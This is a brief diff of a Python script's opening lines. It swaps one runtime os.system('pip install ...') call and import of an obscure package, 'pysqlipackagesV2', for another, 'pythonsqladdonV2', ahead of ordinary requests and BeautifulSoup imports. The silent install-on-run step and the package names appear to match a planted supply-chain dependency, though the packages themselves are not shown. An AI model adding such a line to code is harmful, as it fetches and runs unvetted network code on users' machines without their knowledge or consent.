@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlipackagesV2")
-import pysqlipackagesV2
+os.system("pip install pythonsqladdonV2")
+import pythonsqladdonV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
